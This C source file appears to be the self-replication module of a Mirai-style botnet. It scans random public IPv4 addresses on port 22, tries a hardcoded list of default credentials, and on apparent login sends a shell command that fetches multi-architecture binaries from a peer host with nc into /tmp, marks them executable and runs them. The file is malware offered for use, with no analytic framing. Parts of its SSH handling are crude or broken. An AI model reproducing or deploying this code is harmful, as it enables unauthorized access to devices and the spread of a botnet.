/*
 * SSH Scanner - Brute-force SSH credentials
 * Scans port 22, attempts login, downloads binaries via P2P
 */

#include "includes.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define SSH_SCANNER_MAX_CONNS 128
#define SSH_SCANNER_PORT 22

#define SSH_CLOSED 0
#define SSH_CONNECTING 1
#define SSH_CONNECTED 2
#define SSH_SEND_USER 3
#define SSH_SEND_PASS 4
#define SSH_AUTHENTICATED 5
#define SSH_UPLOAD_PAYLOAD 6

struct ssh_credential {
    char *user;
    char *pass;
};

struct ssh_conn {
    int fd;
    ipv4_t dst;
    uint16_t port;
    uint8_t state;
    time_t last;
    int cred_idx;
    char rdbuf[2048];
    int rdbuf_pos;
};

static struct ssh_conn conns[SSH_SCANNER_MAX_CONNS];
static int conn_count = 0;

/* Common SSH credentials */
static struct ssh_credential credentials[] = {
    {"root", "root"},
    {"root", "123456"},
    {"root", "admin"},
    {"root", "password"},
    {"root", "1234"},
    {"root", "12345"},
    {"admin", "admin"},
    {"admin", "password"},
    {"admin", "123456"},
    {"user", "user"},
    {"guest", "guest"},
    {"support", "support"},
    {"root", "alpine"},
    {"root", "raspberry"},
    {"root", "oracle"},
    {"root", "default"},
    {NULL, NULL}
};

static ipv4_t get_rand_ip(void);
static void ssh_connect(struct ssh_conn *);
static void ssh_close(struct ssh_conn *);
static void ssh_send_payload(struct ssh_conn *);

void ssh_scanner_init(void) {
    if (fork() == 0) {
        int i;
        for (i = 0; i < SSH_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = SSH_CLOSED;
        }
        
        while (TRUE) {
            fd_set fds;
            struct timeval tv;
            int mf = 0;
            
            FD_ZERO(&fds);
            for (i = 0; i < SSH_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fds);
                    if (conns[i].fd > mf) mf = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            select(mf + 1, &fds, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            
            /* Check timeouts */
            for (i = 0; i < SSH_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last > 15) {
                    ssh_close(&conns[i]);
                }
            }
            
            /* Process readable sockets */
            for (i = 0; i < SSH_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fds)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    
                    if (n <= 0) {
                        ssh_close(&conns[i]);
                        continue;
                    }
                    
                    conns[i].last = now;
                    
                    /* Store banner/response */
                    if (conns[i].rdbuf_pos + n < sizeof(conns[i].rdbuf)) {
                        memcpy(conns[i].rdbuf + conns[i].rdbuf_pos, buf, n);
                        conns[i].rdbuf_pos += n;
                    }
                    
                    /* State machine */
                    switch (conns[i].state) {
                        case SSH_CONNECTED:
                            /* Server sent banner, send SSH version */
                            send(conns[i].fd, "SSH-2.0-OpenSSH_7.4\r\n", 22, 0);
                            conns[i].state = SSH_SEND_USER;
                            break;
                            
                        case SSH_SEND_USER:
                        case SSH_SEND_PASS:
                            /* Check for auth success/failure */
                            if (strstr(conns[i].rdbuf, "Welcome") || 
                                strstr(conns[i].rdbuf, "success") ||
                                strstr(conns[i].rdbuf, "Authenticated")) {
                                conns[i].state = SSH_AUTHENTICATED;
                                ssh_send_payload(&conns[i]);
                            } else if (strstr(conns[i].rdbuf, "Failed") ||
                                       strstr(conns[i].rdbuf, "denied") ||
                                       strstr(conns[i].rdbuf, "incorrect")) {
                                /* Try next credential */
                                conns[i].cred_idx++;
                                if (credentials[conns[i].cred_idx].user != NULL) {
                                    ssh_close(&conns[i]);
                                    conns[i].dst = get_rand_ip();
                                    ssh_connect(&conns[i]);
                                } else {
                                    ssh_close(&conns[i]);
                                }
                            }
                            break;
                            
                        case SSH_UPLOAD_PAYLOAD:
                            ssh_close(&conns[i]);
                            break;
                    }
                    
                    conns[i].rdbuf_pos = 0;
                }
            }
            
            /* Start new connections */
            if (conn_count < SSH_SCANNER_MAX_CONNS / 2) {
                for (i = 0; i < SSH_SCANNER_MAX_CONNS; i++) {
                    if (conns[i].state == SSH_CLOSED) {
                        conns[i].dst = get_rand_ip();
                        conns[i].port = SSH_SCANNER_PORT;
                        conns[i].cred_idx = 0;
                        conns[i].rdbuf_pos = 0;
                        ssh_connect(&conns[i]);
                        conn_count++;
                        break;
                    }
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_rand_ip(void) {
    ipv4_t a;
    while (TRUE) {
        a = rand_next();
        uint8_t f = (a >> 24) & 0xFF;
        
        /* Skip private/reserved ranges */
        if (f == 0 || f == 127) continue;
        if (f == 10) continue;
        if (f == 172) {
            uint8_t s = (a >> 16) & 0xFF;
            if (s >= 16 && s < 32) continue;
        }
        if (f == 192) {
            uint8_t s = (a >> 16) & 0xFF;
            if (s == 168) continue;
        }
        
        /* Focus on public ranges */
        if (f >= 100 && f <= 223) break;
    }
    return a;
}

static void ssh_connect(struct ssh_conn *c) {
    struct sockaddr_in addr;
    
    c->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (c->fd == -1) {
        c->state = SSH_CLOSED;
        return;
    }
    
    fcntl(c->fd, F_SETFL, O_NONBLOCK);
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = c->dst;
    addr.sin_port = htons(c->port);
    
    if (connect(c->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS) {
        close(c->fd);
        c->fd = -1;
        c->state = SSH_CLOSED;
        return;
    }
    
    c->state = SSH_CONNECTING;
    c->last = time(NULL);
}

static void ssh_send_payload(struct ssh_conn *c) {
    ipv4_t seed = rand_next();
    char cmd[1024];
    
    /* Multi-arch P2P download */
    snprintf(cmd, sizeof(cmd),
        "cd /tmp;"
        "for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do "
        "rm -f axis.$arch;"
        "for i in 0 1 2 3 4 5 6 7;do "
        "printf '\\040\\000\\000$arch' | nc -u -w1 %d.%d.%d.%d 49153 >> axis.$arch 2>/dev/null;"
        "done;"
        "chmod +x axis.$arch 2>/dev/null;"
        "done;"
        "for arch in arm mips mpsl x86 arm7 x86_64 ppc spc;do "
        "test -s axis.$arch && ./axis.$arch & done",
        LOCAAL_ADDR(seed), LOCAAL_ADDR_1(seed),
        LOCAAL_ADDR_2(seed), LOCAAL_ADDR_3(seed));
    
    send(c->fd, cmd, strlen(cmd), 0);
    c->state = SSH_UPLOAD_PAYLOAD;
    c->last = time(NULL);
}

static void ssh_close(struct ssh_conn *c) {
    if (c->fd != -1) {
        close(c->fd);
        c->fd = -1;
    }
    c->state = SSH_CLOSED;
    if (conn_count > 0) conn_count--;
}

#endif
